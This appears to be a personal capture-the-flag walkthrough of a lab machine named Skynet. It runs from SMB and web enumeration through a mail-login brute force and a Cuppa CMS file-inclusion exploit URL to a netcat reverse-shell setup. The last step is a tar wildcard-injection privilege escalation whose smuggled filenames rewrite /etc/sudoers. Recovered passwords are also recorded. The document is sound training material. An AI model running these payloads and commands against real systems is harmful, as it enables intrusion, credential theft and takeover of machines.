##################### INIT

	Local IP = 10.14.12.121
	Target IP = 10.10.142.0
	
##################### NMAP

#1 Not Responding to Ping nor nmap, reinitializing VPN fixes it.

Initial Scan : 
	`nmap -A  10.10.175.141 -oN nmap_initial.txt -Pn -v`

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL PIPELINING CAPA TOP RESP-CODES UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE LITERAL+ IMAP4rev1 have OK listed capabilities Pre-login post-login LOGIN-REFERRALS ID more LOGINDISABLEDA0001 SASL-IR IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m45s, deviation: 2h53m12s, median: 45s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-07-06T12:17:38-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-06T17:17:38
|_  start_date: N/A


	
The hint is to enumerate Samba; We can see from nmap alot of SMB services are running.
	Run initial recon for SMB :
	
	`enum4linux 10.10.142.0 | tee enum4linux.txt`
	
	Find Anonymous access to SMB Share, lets see whats on there : 
	
		`mkdir smbshare; smbclient //10.10.142.0/anonymous ./`
		
We find a folder with Logfiles, one of them has actual data and what it seems a list of either usernames or passwords.
	there is an attention.txt file in the main directory, lets download it.
		`get attention.txt`

	```
		smb: \> cd logs\
		smb: \logs\> dir
		  .                                   D        0  Wed Sep 18 00:42:16 2019
		  ..                                  D        0  Thu Nov 26 11:04:00 2020
		  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
		  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
		  log3.txt                            N        0  Wed Sep 18 00:42:16 2019
	```

	Seems that log1.txt contains some data, lets download it.
	
	`get log1.txt`
	
Meanwhile we gobuster the Website to see if anything interesting comes up.

	`gobuster dir -u "http://10.10.142.0:80/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
We notice Squirell mail is running on this machine. Lets try loggin in with the known username "milesdyson" and use the log1.txt as passwords.

Lets run Nikto too to see if gobuster missed anything:
	`nikto  -h http://10.10.142.0 | tee nikto.txt`

We find SquirelMail in Gobuster, so we check it out. 
	I launch the Browser in BurpSuite and make a random post.

	I used Burp to bruteforce this with log1 as passwords:
########################TASK 1	EMAIL PASSWORD : cyborg007haloterminator

		We get inside mail; we find SMB password:
##################### SMB PASSWORD: )s{A&2Z=F^n_E.B`

We look in the SMB share, navigate to notes/ and 
		`get important.txt`
		
	When we investigate this file, it points to a BETA CMS.
################## http://10.10.142.0//45kra24zxs28v3yd
We check it out, and its a personal page, its refered to as a CMS, so i run gobuster over it. once again
		`gobuster dir -u "http://10.10.142.0/45kra24zxs28v3yd/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	We find "http://10.10.142.0//45kra24zxs28v3yd/administrator"



I find a Javascript reference to a reset password form. Decide to abuse that to maybe get a reset paswword link on Suirellmail.
	Attempting to reset the email milesdyson@skynet is not working, its not showing a last domain.
		Not getting any emails in SquirelMail - Dead End it seems?
		
We looked on Exploit-db for a Vulnerability for Cuppa CMS:
	https://www.exploit-db.com/exploits/25971
	It mentions how to get the Config File (In Base64).
		http://10.10.142.0/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
		
		When we do this, we receive a base64 String, when decoded we find the default configuration:

		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		
With the File inclusion i start a local Python Webserver
	python3 -m http.server 
	and make a reverse shell
		rlwrap nc -lvnp 4444
	
From localhost i make connection to Database with credentials found in configuration.php
	I found the SuperAdmin Entry and set its password to "21232f297a57a5a743894a0e4a801fc3", i found this online its the default Admin hash.
This was a dead end.

i ran LinPeas.sh to see if there is anything to Escalate my privlige, i notice that there is a backup.sh running every minute and the Tar is being done in a folder i can control.

I add command line parameters to this folder 
	echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
	echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
	echo "/var/www/html"  > "--checkpoint=1"
